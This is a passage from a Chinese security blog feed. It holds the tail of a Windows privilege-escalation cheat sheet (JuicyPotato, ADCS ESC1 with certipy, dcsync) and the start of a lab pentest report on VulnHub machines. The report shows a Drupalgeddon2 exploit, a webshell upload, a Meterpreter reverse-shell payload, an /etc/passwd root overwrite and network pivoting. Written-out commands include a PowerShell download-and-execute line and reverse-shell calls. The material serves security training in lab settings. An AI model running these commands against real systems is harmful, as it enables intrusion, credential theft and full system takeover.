class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80 &amp;</span><br></pre></td></tr></table></figure></li><li>client<ul><li>curl</li><li><code>iex(new-object net.webclient).downloadstring(&quot;http://10.10.*.*/PowerView.ps1&quot;)</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.10.*.*\Bufferfly &#x2F;u:Buffer fly</span><br><span class="line">copy test \\10.10.*.*</span><br><span class="line">net use &#x2F;d \\10.10.*.*\Bufferfly</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="端口转发"><a class="markdownIt-Anchor" href="#端口转发"></a> 端口转发</h2><ul><li>lcx<ul><li><a href="https://github.com/windworst/LCX">https://github.com/windworst/LCX</a></li><li><a href="https://github.com/AA8j/SecTools/raw/main/lcx/lcx.exe">https://github.com/AA8j/SecTools/raw/main/lcx/lcx.exe</a></li></ul></li><li>chisel</li><li>earthworm<ul><li><a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></li></ul></li></ul><h2 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h2><h3 id="runascs"><a class="markdownIt-Anchor" href="#runascs"></a> runascs</h3><blockquote><p><a href="https://github.com/antonioCoco/RunasCs/">https://github.com/antonioCoco/RunasCs/</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runascs c.bum Tikkycoll_431012284 powershell -r 10.10.*.*:9998</span><br></pre></td></tr></table></figure><h3 id="printnightmare"><a class="markdownIt-Anchor" href="#printnightmare"></a> PrintNightmare</h3><blockquote><p><a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a><br /><a href="https://github.com/m8sec/CVE-2021-34527">https://github.com/m8sec/CVE-2021-34527</a></p></blockquote><h3 id="alwaysinstallelevated"><a class="markdownIt-Anchor" href="#alwaysinstallelevated"></a> alwaysinstallelevated</h3><blockquote><p>找到alwaysinstallelevated，即当注册表中的alwaysinstallelevated设置为1时，机器上运行任何的msi程序，均会以system权限执行，我们只需生成一个msi的木马程序即可提权。<br /><a href="https://zhuanlan.zhihu.com/p/375373404">https://zhuanlan.zhihu.com/p/375373404</a></p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    <span class="number">0</span>x1</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    <span class="number">0</span>x1</span><br></pre></td></tr></table></figure><h3 id="juicypotato"><a class="markdownIt-Anchor" href="#juicypotato"></a> JuicyPotato</h3><blockquote><p><a href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe">https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe</a></p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name          Description                               State  </span><br><span class="line">======================= ========================================= =======</span><br><span class="line">SeChangeNotifyPrivilege Bypass traverse checking                  Enabled</span><br><span class="line">SeImpersonatePrivilege  Impersonate a client after authentication Enabled</span><br><span class="line">SeCreateGlobalPrivilege Create global objects                     Enabled</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</li><li>如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</li><li>如果均开启，可以选择-t *</li><li>如果均未开启，那么无法提权</li></ul><blockquote><p><a href="https://blog.csdn.net/god_zzZ/article/details/106334702">https://blog.csdn.net/god_zzZ/article/details/106334702</a></p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p C:\temp\shell.bat -l <span class="number">6666</span> -c &#123;F7FD3FD6-<span class="number">9994</span>-<span class="number">452</span>D-<span class="number">8</span>DA7-<span class="number">9</span>A8FD87AEEF4&#125;</span><br></pre></td></tr></table></figure><h3 id="错误配置证书模板"><a class="markdownIt-Anchor" href="#错误配置证书模板"></a> 错误配置证书模板</h3><blockquote><p>This is a quick lab to familiarize with ECS1 privilege escalation technique, that illustrates how it’s possible to elevate from a regular user to domain administrator in a Windows Domain by abusing over-permissioned Active Directory Certificate Services (ADCS) certificate templates.<br /><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin</a></p></blockquote><ul><li>msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT # 任意证书申请对象</li><li>PkiExtendedKeyUsage: Client Authentication # 证书可用于AD</li><li>Enrollment Rights: Authenticated Users # 证书申请者为经验证的域用户</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install certipy-ad</span><br></pre></td></tr></table></figure><p>查询是否存在错误配置的证书模板</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -vulnerable -stdout -u ryan.cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">[*] Enumeration output:</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : sequel-DC-CA</span><br><span class="line">    DNS Name                            : dc.sequel.htb</span><br><span class="line">    Certificate Subject                 : CN&#x3D;sequel-DC-CA, DC&#x3D;sequel, DC&#x3D;htb</span><br><span class="line">    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101</span><br><span class="line">    Certificate Validity Start          : 2022-11-18 20:58:46+00:00</span><br><span class="line">    Certificate Validity End            : 2121-11-18 21:08:46+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Disabled</span><br><span class="line">    Request Disposition                 : Issue</span><br><span class="line">    Enforce Encryption for Requests     : Enabled</span><br><span class="line">    Permissions</span><br><span class="line">      Owner                             : SEQUEL.HTB\Administrators</span><br><span class="line">      Access Rights</span><br><span class="line">        ManageCertificates              : SEQUEL.HTB\Administrators</span><br><span class="line">                                          SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        ManageCa                        : SEQUEL.HTB\Administrators</span><br><span class="line">                                          SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">        Enroll                          : SEQUEL.HTB\Authenticated Users</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : UserAuthentication</span><br><span class="line">    Display Name                        : UserAuthentication</span><br><span class="line">    Certificate Authorities             : sequel-DC-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : PublishToDs</span><br><span class="line">                                          IncludeSymmetricAlgorithms</span><br><span class="line">    Private Key Flag                    : 16777216</span><br><span class="line">                                          65536</span><br><span class="line">                                          ExportableKey</span><br><span class="line">    Extended Key Usage                  : Client Authentication</span><br><span class="line">                                          Secure Email</span><br><span class="line">                                          Encrypting File System</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 10 years</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Domain Users</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : SEQUEL.HTB\Administrator</span><br><span class="line">        Write Owner Principals          : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">        Write Dacl Principals           : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">        Write Property Principals       : SEQUEL.HTB\Domain Admins</span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins</span><br><span class="line">                                          SEQUEL.HTB\Administrator</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : &#39;SEQUEL.HTB\\Domain Users&#39; can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure><p>域用户<code>ryan.cooper</code>为域管理员<code>administrator</code>申请证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -target dc.sequel.htb -template UserAuthentication -ca sequel-DC-CA -upn administrator@sequel.htb</span><br></pre></td></tr></table></figure><p>使用证书通过Kerberos生成TGT并还原为NT Hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure><h3 id="dcsync"><a class="markdownIt-Anchor" href="#dcsync"></a> dcsync</h3><blockquote><p>“With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz”<br /><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall</a><br />mimikatz有一个dcsync功能, 可以利用卷影拷贝服务直接读取ntds.dll文件并检索域散列值。<br />《内网安全攻防》 P.296</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -dc-ip 10.10.10.30 megacorp.local/svc_bes:Sheffield19@10.10.10.30</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;迟来的文章&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
  </entry>
  
  <entry>
    <title>Pentest With Meterpreter</title>
    <link href="https://yoloyolo.top/2023/02/08/Pentest-With-Meterpreter/"/>
    <id>https://yoloyolo.top/2023/02/08/Pentest-With-Meterpreter/</id>
    <published>2023-02-08T02:55:36.000Z</published>
    <updated>2023-02-08T16:08:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>迟来的文章</p><a id="more"></a><h1 id="渗透测试报告"><a class="markdownIt-Anchor" href="#渗透测试报告"></a> 渗透测试报告</h1><p><code>2019/1/28 16:49:43</code></p><hr \><h2 id="任务规划"><a class="markdownIt-Anchor" href="#任务规划"></a> 任务规划</h2><p>规划区域：虚拟机中的三台服务器<br />测试目标：获取所有服务器的root权限</p><p>渗透目标</p><ul><li><p>A1 hackNos(Ubuntu)<br />IP.0:192.168.31.132<br />IP.1:Unknown</p></li><li><p>A2 lin.security(Ubuntu)<br />IP.0:Unknown<br />IP.1:Unknown</p></li><li><p>A3 hackNos-2(Ubuntu)<br />IP.0:Unknown</p></li></ul><p>攻击方</p><ul><li>B Attacker(Kali)<br />IP.0:192.168.31.10</li></ul><p>网络状况：<br />B能与A1进行网络通信<br />A1能与B和A2进行网络通信<br />A2能与A1进行网络通信</p><h2 id="hacknos"><a class="markdownIt-Anchor" href="#hacknos"></a> hackNos</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><p>用Nmap对目标A1进行端口扫描</p><p><code>nmap -sV -p 1-1000 -T 5 -v -A -n 192.168.31.132</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.132</span><br><span class="line">Host is up (0.011s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)</span><br><span class="line">|   256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)</span><br><span class="line">|_  256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: OPTIONS GET HEAD POST</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="web路径枚举"><a class="markdownIt-Anchor" href="#web路径枚举"></a> Web路径枚举</h3><p><code>dirb http://192.168.31.132 -w</code></p><p>用dirb进行Web目录枚举</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.132&#x2F;drupal&#x2F; </span><br></pre></td></tr></table></figure><p>发现Web服务中存在Drupal框架</p><h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h3><p>搜索得知Drupal框架存在RCE漏洞<br /><code>git clone https://github.com/dreadlocked/Drupalgeddon2.git</code></p><p>尝试对A1使用Exploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install ruby</span><br><span class="line">gem install highline</span><br><span class="line">ruby drupalgeddon2.rb http:&#x2F;&#x2F;192.168.31.132&#x2F;drupal&#x2F;</span><br></pre></td></tr></table></figure><p>成功获取shell</p><h3 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h3><p>本地构造Webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass she.php</span><br></pre></td></tr></table></figure><p>开启本地Web服务<br /><code>python -m SimpleHTTPServer 8000 &amp;</code></p><p>在A1上用wget获取WebShell<br /><code>wget http://192.168.31.10:8000/she.php</code></p><p>连接WebShell<br /><code>weevely http://192.168.31.132/drupal/she.php pass</code></p><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux hackNos 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>生成Meterpreter后门程序并投放<br /><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=1234 -e x86/shikata_ga_nai -i 11 -f elf &gt; msf.elf</code></p><p>利用WebShell上传后门程序<br /><code>file_upload /root/software/msf.elf /var/www/html/drupal/msf.elf</code></p><p>使用MSF进行渗透攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>在A1的WebShell中运行后门程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x msf.elf</span><br><span class="line">.&#x2F;msf.elf</span><br></pre></td></tr></table></figure><p>将meterpreter shell转为bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>查看具有suid权限且属于root用户的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&lt;pal$ find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper           </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign                          </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic              </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device                     </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine                           </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1            </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgidmap                                    </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd                                      </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newuidmap                                    </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;wget                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn                                         </span><br><span class="line">&#x2F;bin&#x2F;ping6                                            </span><br><span class="line">&#x2F;bin&#x2F;umount                                           </span><br><span class="line">&#x2F;bin&#x2F;ntfs-3g                                          </span><br><span class="line">&#x2F;bin&#x2F;mount                                            </span><br><span class="line">&#x2F;bin&#x2F;ping                                             </span><br><span class="line">&#x2F;bin&#x2F;su                                               </span><br><span class="line">&#x2F;bin&#x2F;fusermount                                       </span><br></pre></td></tr></table></figure><p>可以用wget命令提权</p><p>对/etc/passwd文件进行间接修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hackNos: file_download &#x2F;etc&#x2F;passwd passwd</span><br><span class="line">perl -le &#39;print crypt(&quot;hackforfun&quot;,&quot;addedsalt&quot;)&#39;</span><br><span class="line">    adWo3GnVnKzuU</span><br><span class="line">echo &#39;test:adWo3GnVnKzuU:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwd</span><br><span class="line">hackNos: wget http:&#x2F;&#x2F;192.168.31.10:8000&#x2F;passwd -O &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>在bash中切换账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><p>在Meterpreter查看A1的网络信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : lo</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 65536</span><br><span class="line">Flags        : UP,LOOPBACK</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  2</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : enp0s3</span><br><span class="line">Hardware MAC : 08:00:27:7d:4c:83</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.31.132</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::a00:27ff:fe7d:4c83</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line">IPv6 Address : fe80::a00:27ff:fe7d:4c83</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  3</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : enp0s8</span><br><span class="line">Hardware MAC : 08:00:27:65:bd:8b</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.56.109</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::a00:27ff:fe65:bd8b</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></pre></td></tr></table></figure><p>发现192.168.56.0网段</p><p>在Meterpreter中添加路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.56.0&#x2F;24</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.56.0       255.255.255.0      Session 1</span><br></pre></td></tr></table></figure><p>在MSF中扫描内网网段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep </span><br><span class="line">set RHOSTS 192.168.56.0&#x2F;24</span><br><span class="line">set THREADS 20</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">[+] 192.168.56.103 appears to be up (CADMUS COMPUTER SYSTEMS)</span><br></pre></td></tr></table></figure><p>发现内网机器A2</p><p>添加sock代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;socks4a</span><br><span class="line">set srvport 9999</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>修改Proxychain文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">    socks4 192.168.31.10 9999</span><br></pre></td></tr></table></figure><hr /><h2 id="linsecurity"><a class="markdownIt-Anchor" href="#linsecurity"></a> lin.security</h2><h3 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h3><p>proxychains代理Nmap对A2进行端口扫描</p><p><code>proxychains nmap -sT -Pn -v -T5 -A 192.168.56.103</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 